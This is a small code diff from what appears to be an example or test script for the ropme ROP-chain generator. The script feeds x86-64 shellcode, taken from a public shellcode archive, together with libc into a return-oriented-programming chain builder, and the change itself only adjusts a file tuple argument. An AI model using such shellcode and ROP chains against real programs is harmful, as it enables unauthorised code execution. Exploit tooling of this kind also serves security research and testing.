@@ -23,7 +23,7 @@ shellcode = ( # http://shell-storm.org/shellcode/files/shellcode-603.php
  +  "\x0f\x05"                                      # syscall
 )
 
-files = [(filename, None, 0)]
+files = [(filename, None, None)]
 libs = ["/lib/x86_64-linux-gnu/libc.so.6"]
 rop = ropme.rop(files, libs, [["shellcode_hex", binascii.hexlify(shellcode)]], arch = arch, log_level = logging.DEBUG)
 
